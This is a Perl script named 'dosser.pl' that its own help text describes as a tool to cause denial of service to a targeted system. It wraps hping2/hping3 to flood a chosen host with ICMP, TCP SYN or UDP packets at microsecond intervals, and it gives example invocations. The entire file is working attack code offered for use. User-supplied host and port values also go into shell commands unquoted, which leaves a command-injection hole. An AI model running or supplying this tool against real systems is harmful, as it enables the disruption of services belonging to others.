#!/usr/bin/perl
use strict;
use File::Which qw(which where);
use Time::HiRes qw (usleep);
use Getopt::Std;
use Data::Dumper;

die "Must run as root or with sudo\n" if $> != 0;

my ($host, $count, $time, $type, $port, %opts);

getopts('h:t:c:l:p:', \%opts);

#if (!($opt_t && $opt_c) || !($opt_t && $opt_l) ){
# die "You must provide valid parameters!\n";
#}

if ( $opts{h} ){
 $host = $opts{h};
}

if ( $opts{c} ){
 $count = $opts{c};
}

if ( $opts{t} ) {
 $type = $opts{t};
}

if ( $opts{l} ){
 $time = $opts{l};
}

if ( $opts{p} ){
 $port = $opts{p};
}

if (!%opts){
 system("clear");
 print "HELP:\n";
 print "This tool can cause DoS of targeted system.\n";
 print "\tThis tool requires hping2 or hping3 to be installed on system.
 \tDebian|Ubuntu: apt install hping3. RedHat|CentOS:yum install hping2\n";
 print "\t-h TARGET\n";
 print "\t-t attack type. Valid ones are: icmp,tcp,udp\n";
 print "\t-c packet count.\n";
 print "\t-l max time to run in seconds. You can not combine -c and -l\n";
 print "\t-p PORT number. This must be valid option for tcp, udp attack\n";
 print "\tExample of ICMP attack: perl dosser.pl -h 10.10.10.1 -c 10000 -t icmp\n";
 print "\tExample of TCP attack: perl dosser.pl -h 10.10.10.1 -l 60 -t tcp -p 443\n";
 print "\tExample of TCP attack: perl dosser.pl -h 10.10.10.1 -l 60 -t udp -p 53\n";
 exit(1);
}

print "Options:\n";
print Dumper (\%opts);

my $hping2 = which 'hping2';
my $hping3 = which 'hping3';
my $hping;

if ($hping2){
  $hping = $hping2;
} elsif ($hping3) {
  $hping = $hping3;
} else {
  system("$hping --help");
  die "No hping found. Needs to install\n";
}

if ($type !~ /icmp|syn|tcp|udp/) {
 print("Invalid attack type. Valid are: icmp,tcp/syn,udp. Exiting\n");
 exit(1);
}


# ICMP attacks
if ( $type =~  /^icmp$/ ){
 print "ICMP attack\n";
 if ($count !=0){ 
  print("Sending $count ICMP packets to host: $host\n");
  `$hping -1 -c $count -i u1 $host -q >/dev/null 2>&1`;
 }

 if ($time !=0){
  print("Sending ICMP packets to host: $host for next: $time seconds.\n");
  `timeout $time $hping -1 -i u1 $host -q >/dev/null 2>&1`;
 }

} 

if ( $type =~ /^tcp$/ ){
 die "You must provide port number!\n" if !$port;
 if ($count !=0){ 
  print("Sending $count SYN packets to host: $host\n");
  `$hping -S -c $count -i u1 -p $port $host -q >/dev/null 2>&1`;
 }
 if ($time !=0){
  print("Sending SYN packets to host: $host for next: $time seconds.\n");
  `timeout $time $hping -S -i u1 -p $port $host -q >/dev/null 2>&1`;
 }
}

if ( $type =~ /^udp$/ ){
 die "You must provide port number!\n" if !$port;
 if ($count !=0){ 
  print("Sending $count UDP packets to host: $host\n");
  `$hping -2 -c $count -i u1 -p $port $host -q >/dev/null 2>&1`;
 }
 if ($time !=0){
  print("Sending UDP packets to host: $host for next: $time seconds.\n");
  `timeout $time $hping -2 -i u1 -p $port $host -q >/dev/null 2>&1`;
 }

} 

exit(0);

